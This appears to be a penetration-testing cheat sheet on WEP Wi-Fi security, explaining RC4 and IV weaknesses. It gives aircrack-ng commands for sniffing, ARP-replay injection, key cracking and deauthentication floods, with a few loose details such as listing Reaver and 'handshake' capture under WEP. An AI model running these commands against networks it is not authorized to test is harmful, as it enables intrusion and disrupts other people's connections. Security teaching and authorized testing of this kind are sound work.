# WEP

## Theory

WEP is a security protocol designed to provide a wireless local area network (WLAN) with a level of security and privacy comparable to what is usually expected of a wired LAN. Although WEP was designed to ensure that only authorized users can access the wireless network and to encrypt data transmissions, it has several vulnerabilities that make it ineffective for securing wireless networks today.

#### Vulnerabilities:

* Encryption: WEP uses the RC4 stream cipher for encryption, with a fixed key length of 40 bits or 104 bits.
* Integrity Check: WEP includes a cyclic redundancy check (CRC) for data integrity, but it does not provide strong authentication or key management.
* Weak encryption keys: The small key size (40 or 104 bits) and reuse of keys make it vulnerable to attacks.
* IV (Initialization Vector) reuse: The IV used in WEP is not random enough, leading to predictable patterns that can be exploited.

### Requirements

* Wireless Network Card: A card that supports monitor mode (e.g., Atheros, Ralink).
* Linux OS: Kali Linux is commonly used for penetration testing.
* Tools:
  * Aircrack-ng suite
  * Reaver
  * Wifite

## Attacks

#### 1. **Packet Sniffing**

Description: Capturing wireless packets transmitted over the WEP-encrypted network.

Command Example:

```bash
airodump-ng wlan0
```

_Replace `wlan0` with your network interface in monitor mode._

#### 2. IV Injection Attack

Description: Exploiting the predictable nature of the IVs used in WEP, allowing attackers to inject packets into the network.

Command Example:

```bash
aireplay-ng --arpreplay -b [Target_BSSID] -h [Your_MAC_Address] wlan0
```

_Replace `[Target_BSSID]` with the target network's BSSID and `[Your_MAC_Address]` with your own MAC address._

#### 3. **WEP Key Cracking**

Description: Capturing enough packets to recover the WEP key used for encryption.

Command Example:

```bash
aircrack-ng -b [Target_BSSID] [Capture_File].cap
```

_Replace `[Capture_File].cap` with the file containing the captured packets._

#### 4. WEP Deauthentication Attack

Description: Forcing a client to disconnect from the network, which allows the attacker to capture the handshake process and collect more IVs.

Command Example:

```bash
aireplay-ng --deauth 10 -a [Target_BSSID] wlan0
```

_Replace `10` with the number of deauthentication packets to send._

## Resources:

* [Aircrack-ng](https://www.aircrack-ng.org/index.html)
* [Wi-Fi Hacking Series- Exploring WEP Attacks (Part-2)](https://vengeance.medium.com/wi-fi-hacking-series-exploring-wep-attacks-part-2-fbfc52cf9e7a)
